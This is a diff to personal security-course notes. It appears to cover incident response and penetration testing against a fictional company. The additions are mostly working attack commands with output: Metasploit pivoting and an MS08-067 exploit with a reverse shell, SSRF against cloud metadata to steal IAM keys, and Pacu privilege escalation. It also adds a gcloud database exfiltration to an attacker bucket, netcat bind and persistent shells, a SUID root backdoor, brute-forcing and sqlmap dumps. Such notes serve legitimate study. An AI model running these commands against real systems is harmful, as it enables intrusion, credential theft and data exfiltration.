@@ -266,6 +266,14 @@ tcpdump -r FILE_PATH -n -A
 
 ## BPF: Berkeley packet filters
 
+The format is
+
+```
+[protocol] [direction] [field]
+```
+
+Example is:
+
 ```
 dst host 192.168.1.0
 src host 192.168.1
@@ -304,6 +312,46 @@ vlan && vlan 300 && ip
 mpls 100000 && mpls 1024
 mpls && mpls 1024 && host 192.9.200.1
 ```
+
+could be used with `tcpdump`
+
+| Purpose                        | Command                                                                           |
+| ------------------------------ | --------------------------------------------------------------------------------- |
+| All traffic on eth0            | `tcpdump -i eth0`                                                                 |
+| Only TCP traffic               | `tcpdump -i eth0 tcp`                                                             |
+| Capture HTTPS                  | `tcpdump -i eth0 port 443`                                                        |
+| Filter by IP                   | `tcpdump -i eth0 host 192.168.1.10`                                               |
+| Traffic from a specific subnet | `tcpdump -i eth0 net 192.168.1.0/24`                                              |
+| Capture to file                | `tcpdump -i eth0 -w capture.pcap`                                                 |
+| Read capture file              | `tcpdump -r capture.pcap`                                                         |
+| DNS Queries                    | `tcpdump -i eth0 udp port 53`                                                     |
+| Only SYN packets               | `tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'` |
+| ICMP (pings)                   | `tcpdump -i eth0 icmp`                                                            |
+
+
+### wireshark display filter
+
+```
+[protocol].[field] [operator] [value]
+```
+
+| Purpose                       | Display Filter                                    |
+| ----------------------------- | ------------------------------------------------- |
+| Show all HTTP traffic         | `http`                                            |
+| Traffic from a source IP      | `ip.src == 192.168.1.10`                          |
+| Traffic to a destination IP   | `ip.dst == 10.0.0.5`                              |
+| Show TCP SYN packets          | `tcp.flags.syn == 1 and tcp.flags.ack == 0`       |
+| TCP conversations between IPs | `ip.addr == 192.168.1.10 and ip.addr == 10.0.0.5` |
+| Filter by port                | `tcp.port == 443`                                 |
+| Show UDP only                 | `udp`                                             |
+| ICMP packets                  | `icmp`                                            |
+| DNS requests                  | `dns` or `udp.port == 53`                         |
+| DHCP packets                  | `bootp`                                           |
+| HTTP GET requests             | `http.request.method == "GET"`                    |
+| TLS Handshake                 | `ssl.handshake` or `tls.handshake.type == 1`      |
+| Filter by MAC                 | `eth.addr == 00:11:22:33:44:55`                   |
+
+
 
 ## Squid access.log
 
@@ -480,6 +528,47 @@ smbclient -L //192.168.99.10 -U ksmith -m SMB2
 smbclient -L \\\\192.158.99.10 -U ksmith
 smbclient //192.168.99.10/accounting -U ksmith -m SMB2
 ```
+
+```
+[root@x:/app]# smbclient -L //10.0.1.8/ -U User
+Password for [WORKGROUP\User]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Users           Disk      
+SMB1 disabled -- no workgroup available
+[root@x:/app]# smbclient //10.0.1.8/Users -U User
+Password for [WORKGROUP\User]:
+Try "help" to get a list of possible commands.
+smb: \> cd Users
+cd \Users\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \> ls
+  .                                  DR        0  Fri Sep  6 16:12:56 2024
+  ..                                DHS        0  Tue Apr 29 14:05:13 2025
+  Default                           DHR        0  Fri Sep  6 16:22:57 2024
+  desktop.ini                       AHS      174  Sat May  7 14:22:32 2022
+  User                                D        0  Fri May 23 00:40:56 2025
+
+                58209535 blocks of size 4096. 45611489 blocks available
+smb: \> cd User
+smb: \User\> cd Desktop\
+smb: \User\Desktop\> ls
+  .                                  DR        0  Sat Nov 30 18:04:41 2024
+  ..                                  D        0  Fri May 23 00:40:56 2025
+  desktop.ini                       AHS      282  Fri Sep  6 16:23:17 2024
+  MarketSpeed2.lnk                    A     2365  Sat Nov 30 18:04:42 2024
+  Microsoft Edge.lnk                  A     2347  Fri Sep  6 15:28:33 2024
+
+                58209535 blocks of size 4096. 45611489 blocks available
+smb: \User\Desktop\> tar c desktop.ini
+tar: dumped 3 files and 0 directories
+Total bytes written: 4994 (0.0 MiB/s)
+smb: \User\Desktop\> exit
+```
+
 
 #### DeepBlue
 
@@ -798,8 +887,8 @@ tom:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
 
 ## Hashing in linux
 
-- /etc/passwd: user names
-- /etc/shadow: password hashes
+- `/etc/passwd`: user names
+- `/etc/shadow`: password hashes
 
 ```
 <USERNAME>:$<HASHTYPE>$<SALT>$<ENCODED_HASH>
@@ -897,6 +986,53 @@ windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"
 [*] Starting persistent handler(s)...
 ```
 
+the other example is
+
+```
+# Step 1: Background the current session
+msf6 > background
+[*] Backgrounding session 1...
+
+# Step 2: Add route through the session to reach internal LAN
+msf6 > route add 192.168.56.0 255.255.255.0 1
+[*] Route added
+
+# Step 3: Use post/multi/manage/autoroute (optional check)
+msf6 > use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set SESSION 1
+msf6 post(multi/manage/autoroute) > run
+[*] Route added to subnet 192.168.56.0/24 via session 1
+
+# Step 4: Scan the internal LAN via the session
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.56.0/24
+msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,135,139,445
+msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
+msf6 auxiliary(scanner/portscan/tcp) > run
+[*] Scanning 192.168.56.0/24...
+[+] 192.168.56.105:445 - TCP OPEN
+[+] 192.168.56.102:80 - TCP OPEN
+
+# Step 5: Attack a discovered host (e.g. with MS08-067 exploit)
+msf6 > use exploit/windows/smb/ms08_067_netapi
+msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.56.105
+msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.56.1
+msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4445
+msf6 exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Exploit completed, launching session...
+[*] Meterpreter session 2 opened
+
+# Step 6: Interact with new session
+msf6 > sessions -i 2
+[*] Starting interaction with session 2...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
 ## Web attacks
 
 - drive-by attack: Attacker compromises a weak and legitimate website, users will access the website, and js will be kicked and important data is sent to attacker's server
@@ -981,6 +1117,8 @@ Have the server facing the attacker access other web sites typically hidden by F
 
 ### IMDS: Instance MetaData Service
 
+AWS
+
 ```
 curl -s http://169.254.169.254/latest/dynamic/instance-identity/document 
 {
@@ -1002,6 +1140,34 @@ curl -s http://169.254.169.254/latest/dynamic/instance-identity/document
 }
 ```
 
+Azure: `Metadata: true`
+
+```
+azurevm $ curl --silent
+"http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAdd
+ress/0/publicIpAddress?api-version=2017-04-02&format=text"; echo
+{ "error": "Bad request: . Required metadata header not specified" }
+azurevm $ curl --silent -H "Metadata: true"
+"http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAdd
+ress/0/publicIpAddress?api-version=2017-04-02&format=text"; echo
+52.168.72.115
+```
+
+Google: `Metadata-Flavor: Google`
+
+```
+gcpvm $ curl
+http://metadata.google.internal/computeMetadata/v1/project/project-id;
+echo
+<p>Your client does not have permission to get URL
+<code>/computeMetadata/v1/project/project-id</code> from this server.
+Missing Metadata-Flavor:Google header. <ins>That's all we know.</ins>
+gcpvm $ curl -H 'Metadata-Flavor: Google'
+http://metadata.google.internal/computeMetadata/v1/project/project-id;
+echo
+```
+
+
 ## Insecure cloud storage
 
 ### Cloud Storage Access
@@ -1009,6 +1175,41 @@ curl -s http://169.254.169.254/latest/dynamic/instance-identity/document
 - AWS: https://s3.amazonaws.com/BUCKETNAME
 - GCP: https://www.googleapis.com/storage/v1/b/BUCKETNAME
 - Azure: https://ACCOUNTNAME.blob.core.windows.net/CONTAINERNAME
+
+### Bucket finder for AWS, by wordlist
+
+```
+$ bucket_finder.rb word_list.txt --download
+Bucket found but access denied: microsoft
+Bucket does not exist: sans-dev
+Bucket Found: joshsprivatestuff (
+http://s3.amazonaws.com/joshsprivatestuff ) <Downloaded>
+http://s3.amazonaws.com/joshsprivatestuff/01%20Infant%20Selachii.wav
+```
+
+### GCP Bucket Brute
+
+```
+$ gcpbucketbrute.py -u -k falsimentis <-- Keyword
+Generated 1216 bucket permutations.
+UNAUTHENTICATED ACCESS ALLOWED: falsimentis-dev
+- UNAUTHENTICATED LISTABLE (storage.objects.list)
+- UNAUTHENTICATED READABLE (storage.objects.get)
+$ gsutil ls gs://falsimentis-dev
+gs://falsimentis-dev/01 Toddler Selachimorpha.wav  <-- DOWNLOAD
+gsutil -m cp -r gs://falsimentis-dev .
+```
+
+### Basic Blob Finder for Azure
+
+```
+$ basicblobfinder.py namelist
+Valid storage account and container name: falsimentis:falsimentis-
+container
+Blob data objects:
+https://falsimentis.blob.core.windows.net/falsimentis-container/01
+Newborn Euselachii.wav
+```
 
 # 5
 
@@ -1079,7 +1280,7 @@ msf5 exploit(windows/smb/psexec) > exploit
 meterpreter >
 ```
 
-#### Port scanning
+#### Port scanning on a routed session
 
 After pivotting, we do recon 
 
@@ -1340,4 +1541,327 @@ credman :
 * Username : admin
 * Domain : 172.16.0.10
 * Password : _AhxmAKs3Xwx7VhQ@sCo
+```
+
+### Cloud Environment
+
+#### AWSCLIL
+
+| subcommand | functionality |
+| --- | --- |
+| get-caller-identity | whoami like |
+| ec2 describe-instances | List of instances |
+| s3 ls | List buckets |
+| lambda list-functions | List lambda functions |
+| iam list-roles | List iam roles |
+| iam list-users | List iam users |
+| logs describe-log-groups | list CloudWatch logs |
+
+#### AWS IMDSv1 (via SSRF)
+
+```
+~ $ curl -v
+http://login.falsimentis.com/imgget.php?logo=http://169.254.169.254/latest/meta-
+data/iam/security-credentials/; echo
+aws-elasticbeanstalk-ec2-role
+~ $ curl -v
+http://login.falsimentis.com/imgget.php?logo=http://169.254.169.254/latest/meta-
+data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/; echo
+{
+"Code" : "Success",
+"LastUpdated" : "2021-01-13T11:51:30Z",
+"Type" : "AWS-HMAC",
+"AccessKeyId" : "ASIAXXXXXXXXXXXXEETO",
+"SecretAccessKey" : "Z/neXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXVT9",
+"Token" : IQoJbajhUv5lxwL...QpGZhzL6/BN4uVgBP/zZkhShLmmYHULH6r5p91uG+Q==",
+"Expiration" : "2021-01-13T18:07:24Z"
+}
+```
+
+#### Pacu
+
+Metasploit for AWS
+
+```
+root@allevil:~/pacu# ./cli.py
+Pacu (jmerckle-falsimentis:No Keys Set) > import_keys jmerckle
+Pacu (jmerckle-falsimentis:imported-jmerckle) > run iam__enum_permissions
+Running module iam__enum_permissions...
+Pacu (jmerckle-falsimentis:imported-jmerckle) > run iam__privesc_scan
+Running module iam__privesc_scan...
+[iam__privesc_scan] Escalation methods for current user:
+[iam__privesc_scan] CONFIRMED: PutUserPolicy
+[iam__privesc_scan] Attempting confirmed privilege escalation methods...
+[iam__privesc_scan] Successfully added an inline policy named dnr9s7e846!
+You should now have administrator permissions.
+```
+
+#### gcloud (like awsclli, not attack tools)
+
+```
+root@allevil# gcloud sql instances list  <-- LIST DB INSTANCES
+fm-research MYSQL_8_0 us-east1-c db-custom-4-26624 34.138.195.165
+- RUNNABLE
+root@allevil# gcloud sql databases list -i fm-research  <-- LIST SCHEMES FOR THE INSTANCE
+ai utf8 utf8_general_ci
+root@allevil# gsutil mb gs://sqlexfil  <-- CREATE BUCKET FOR DOWNLOADING DB
+Creating gs://sqlexfil/...
+root@allevil# gsutil acl ch -u jmerckle@falsimentis.com:WRITE gs://sqlexfil  <-- GRANT THE CURRENT USER ACCESS TO THE BUCKET
+Updated ACL on gs://sqlexfil/
+root@allevil# gcloud sql export sql fm-research --database=ai  <-- EXPORT DB DUMP TO THE BUCKET
+gs://sqlexfil/sqldump.gz
+Exporting Cloud SQL instance...done.
+Exported [https://sqladmin.googleapis.com/sql/v1beta4/projects/cryptic-
+woods-298720/instances/fm-research] to [gs://sqlexfil/sqldump.gz].
+root@allevil# gsutil cp gs://sqlexfil/sqldump.gz .  <-- DOWNLOAD THE DUMP FROM THE BUCKET
+Copying gs://sqlexfil/sqldump.gz...
+- [1 files][ 342.0 MiB/ 342.0 MiB]
+```
+
+#### CloudMapper for AWS
+
+```
+cloudmapper.py prepare --config config.json --account acctname
+cloudmapper.py report --config config.json --account acctname
+cloudmapper.py webserver
+```
+
+
+#### ScoutSuite for AWS, Azure, GCP
+
+Scan vulns or misconfigured resources
+
+# A: Tools
+
+## nmap
+
+Run an aggressive Nmap scan (scan, OS fingerprint, version scan, and NSE scripts) and save output to a file for future reference
+
+```
+$ sudo nmap -A target --reason -o file
+```
+
+Scan specific port(s) on target
+
+```
+$ sudo nmap -p port(s) target --reason
+```
+
+Perform a version scan on specific port(s)
+
+```
+$ sudo nmap -sV -p port(s) target --reason
+```
+
+## Metasploit
+
+Steps to set up an exploit/payload combo
+
+Launch Metasploit
+
+```
+$ msfconsole
+```
+
+Search for an exploit matching keyword
+
+```
+msf > search keyword type:exploit
+```
+
+Use a particularly stable exploit
+
+```
+msf > use exploit/windows/smb/psexec
+```
+
+Set the SMB User
+
+```
+msf > set SMBUser [ADMIN_USER]
+```
+
+Set the SMB Password
+
+```
+msf > set SMBPass [ADMIN PASS]
+```
+
+Set the SMB Domain
+
+```
+msf > set SMBDomain [Windows Domain]
+```
+
+Set the Exploit Payload
+
+```
+msf > set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+Set LHOST
+
+```
+msf > set LHOST tun0
+```
+
+Set the target information
+
+```
+msf > set RHOSTS 10.142.145.120
+```
+
+Once all options are set, run:
+
+```
+msf > exploit
+```
+
+You might need to list and interact with session(s)
+
+```
+msf > sessions -l
+msf > sessions -i SessionNum
+meterpreter> hashdump
+```
+
+## Meterpreter
+
+```
+meterpreter > shell
+meterpreter > migrate -N lsass.exe
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(windows/smb/psexec) >
+msf5 exploit(windows/smb/psexec) >
+route add 10.10.0.2 255.255.255.255 1
+[*] Route added
+```
+
+## Hashcat
+
+Crack passwords with a wordlist in automated mode
+
+```
+hashcat hash_file.txt word_list.txt
+```
+
+Display cracked passwords
+
+```
+hashcat hash_file.txt --show
+```
+
+Display uncracked passwords
+
+```
+hashcat hash_file.txt --left
+```
+
+## legba
+
+```
+legba -U josh -P password -T 10.0.0.1 ssh
+legba -U user_list.txt -P password_list.txt -T 10.0.0.1 smb
+```
+
+## net (Windows)
+
+View currently active shares
+
+```
+> net iuse
+```
+
+To access drives
+
+```
+> net use Z:
+```
+
+Create local admin user and group, and delete a user
+
+```
+> net user /add <USER_NAME> <PASSWORD>
+> net localgroup <GROUP_NAME> /add <USER_NAME>
+> net user <USER_NAME> /delete
+```
+
+Map local drive to remote C:
+
+```
+> net use * \\target\C$ <PASSWORD> /u:<TARGET_IP>\<USER_NAME>
+```
+
+View local shares
+
+```
+> net share
+```
+
+## smbclient
+
+```
+smbclient -L //10.0.0.1 -U win
+smbclient //10.0.0.1/C$ -U win -m SMB3
+```
+
+## Netcat
+
+Listner
+
+```
+nc -lnvp 4444
+```
+
+> -n: no dns
+
+Connect
+
+```
+nc -vn 10.0.0.1 4444
+```
+
+Send a shell from Listener
+
+```
+nc -lnpv 4444  -e /bin/bash
+```
+
+Send (content of) file 
+
+```
+nc -lnvp 4444 < <FILE>
+```
+
+Persistent shell
+
+```
+while [ 1 ]; do echo "started"; nc lnp 4444 -e /bin/bash; done
+```
+
+## Find
+
+Find files with SETUID flag, owned by root (files that can executed with root priv)
+
+```
+find / -uid 0 -type f -perm -4000 2> /dev/null
+```
+
+Preserving root
+
+```
+$ cp /bin/sh /tmp/backdoor
+$ sudo chown root:root /tmp/backdoor
+$ sudo chmod 4755 /tmp/backdoor
+$ /tmp/backdoor –p
+```
+
+## Sqlmap
+
+```
+sqlmap -u "https://example.com/login" --data "username=1&password=2" --dbs
+sqlmap -u "https://example.com/login" --data "username=1&password=2" -D db_example --tables
+sqlmap -u "https://example.com/login" --data "username=1&password=2" -D db_example -T table_example --columns
+sqlmap -u "https://example.com/login" --data "username=1&password=2" -D db_example -T table_example --dump
 ```
